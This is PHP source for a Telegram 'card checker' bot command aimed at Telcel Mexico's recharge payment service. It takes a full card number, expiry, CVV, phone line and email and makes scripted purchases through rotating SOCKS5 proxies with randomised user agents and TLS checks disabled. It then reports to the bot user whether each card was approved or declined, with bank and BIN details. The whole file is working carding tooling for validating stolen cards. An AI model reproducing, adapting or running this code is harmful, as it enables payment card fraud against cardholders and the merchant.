<?php
list($cmd) = explode(" ", $message);
if($cmd == "/tc" or $cmd == ".tc" or $cmd == "!tc"){
sendaction($chatId, typing);
$tiempo_inicial = microtime(true);
is_premium();
$input ='Telcel';
is_gateroff($input);
$args = explode(",", substr($message, 4));
$cc = trim($args[0]);
$linea = trim($args[1]);
$email = trim($args[2]);
$aomu = trim($args[3]);

   if (empty($cc) || empty($linea) || empty($email) || empty($aomu)){
        reply_to($chatId, $message_id,$keyboard,'<b>[ϟ] Gate Special: >_$-Telcel MX%0A━━━━━━━━━━━━━━━━%0A[ϟ] Gateway: <code>$NameGater</code>%0A[ϟ] Pasarela: <code>Telcel MX</code>%0A[ϟ] Status: <code>ONLINE! 🟩</code>%0A[ϟ]Format: <code>!tc Card,Numero,Correo,Monto</code>%0A━━━━━━━━━━━━━━━━</b>');
        die();
    }
    
$vlr = array(20,50,100,200,500);
if (!in_array($aomu, $vlr)) { 
    reply_to($chatId, $message_id,$keyboard,'<b>Montos Disponbles = 20, 50, 100, 200 y 500</b>');
    exit();
}
    
$messageidtoedit1 = bot('sendMessage', [
		'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
	'reply_to_message_id'=>$message_id,
	'parse_mode'=>'HTML',
		'text' =>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Special: >_$-Telcel MX
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$input</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Number: <code>$linea</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Email: <code>$email</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Monto MX: <code>$aomu</code>
━━━━━━━━━━━━━━━━</b>"
	]);
$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

$Rank = getUserRank($userId, $chatId, $Mi_Id);

$card = explode("|", $cc);
$cc = $card[0];
$mes = $card[1];
$ano = $card[2];
$cvv = $card[3];
if(strlen($ano) == 4){
    $ano = substr($ano, -2);
};

$cc3 = substr($cc, 0,6);
$res = bininfo($cc3);
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

$Idcooki = uniqid();
$userAgent = (new userAgent) ->generate('chrome');

$rotate = rotate();
$socks5 = socks5(); 


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://example.invalid/legacy');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: paymentservice.mitelcel.com';
$headers[] = 'User-Agent: '.$userAgent.'';
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://example.invalid/legacy';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://example.invalid/legacy';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"Anonymous","password":"","channelRequest":{"channelCode":2,"channelDetail":11,"channelSource":"WEB"},"packageType":"","packageId":""}');
$curl = curl_exec($ch);
$token = trim(strip_tags(getStr($curl, '"token":"', '"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://example.invalid/legacy'.$linea.'');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: paymentservice.mitelcel.com';
$headers[] = 'User-Agent: '.$userAgent.'';
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$token.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'DNT: 1';
$headers[] = 'Referer: https://example.invalid/legacy';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
$curl = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://example.invalid/legacy');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'OPTIONS');
$headers = array();
$headers[] = 'Host: mitelcel1.recarga.telcel.com';
$headers[] = 'User-Agent: '.$userAgent.'';
$headers[] = 'Accept: */*';
$headers[] = 'Access-Control-Request-Method: POST';
$headers[] = 'Access-Control-Request-Headers: content-type';
$headers[] = 'Referer: https://example.invalid/legacy';
$headers[] = 'Origin: https://example.invalid/legacy';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
$curl = curl_exec($ch);
curl_close($ch);

function tcl($cc) {
    $firstDigit = substr($cc, 0, 1);

    switch ($firstDigit) {
        case '4':
            return 'VISA';
        case '5':
            return 'MASTERCARD';
        case '3':
            return 'AMEX';
        case '6':
            return 'DISCOVER';
        default:
            return 'unknown';
    }
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://example.invalid/legacy');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: mitelcel1.recarga.telcel.com';
$headers[] = 'User-Agent: '.$userAgent.'';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://example.invalid/legacy';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://example.invalid/legacy';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"ChargeAccountNumber":"'.$cc.'"}');
$curl = curl_exec($ch);
$PaymentDeviceLast4 = trim(strip_tags(getStr($curl, '"PaymentDeviceLast4":"', '"')));
$ChargeAccountNumberToken = trim(strip_tags(getStr($curl, '"":"', '"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://example.invalid/legacy');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: paymentservice.mitelcel.com';
$headers[] = 'User-Agent: '.$userAgent.'';
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$token.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://example.invalid/legacy';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://example.invalid/legacy';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"category":"RECARGA","linea":"'.$linea.'","productCode":'.$aomu.',"productName":"-","validity":"-","amount":'.$aomu.',"cardType":"'.tcl($cc).'","cardToken":"'.$ChargeAccountNumberToken.'","lastDigits":"'.$PaymentDeviceLast4.'","expDate":"'.$mes.''.$ano.'","zipCode":"92233","email":"'.$email.'"}');
$curl = curl_exec($ch);
$sessionKey = trim(strip_tags(getStr($curl, '"sessionKey":"', '"')));
$webSessionId = trim(strip_tags(getStr($curl, '"webSessionId":"', '"')));
$organizationId = trim(strip_tags(getStr($curl, '"organizationId":"', '"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://example.invalid/legacy'.$organizationId.'&sessionKey='.$webSessionId.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: paymentservice.mitelcel.com';
$headers[] = 'User-Agent: '.$userAgent.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://example.invalid/legacy';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: iframe';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
$curl = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://example.invalid/legacy');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: paymentservice.mitelcel.com';
$headers[] = 'User-Agent: '.$userAgent.'';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer '.$token.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://example.invalid/legacy';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://example.invalid/legacy';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"sessionKey":"'.$sessionKey.'","webSessionId":"'.$webSessionId.'","cvv":"'.$cvv.'"}');
$response = curl_exec($ch);

$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);



if($response == ''){
$status = "Approved!✅";
$response = "¡Tu recarga fué realizada con éxito! ✅";
}elseif ($response == '{"timestamp":"2024-03-06T02:53:46.422+0000","status":401,"error":"Unauthorized","message":"Unauthorized","path":"/confirm/order"}'){ 
$status = "DECLINED 🔴";
$response = 'Tu compra no fue autorizada por el banco. Intenta con otra forma de pago o ponte en contacto con tu banco.';
}elseif ($response == 'Your order is confirmed'){ 
$status = "Approved!✅";
$response = "Your order is confirmed(39$)✅";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "Tu compra no fue autorizada por el banco. Intenta con otra forma de pago o ponte en contacto con tu banco.";
   }
   
  bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Special: >_$-Telcel MX
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>$status</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Response: <code>$response</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Time: <code>$tiempo s</code> | Gate: <code>$input $aomu</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}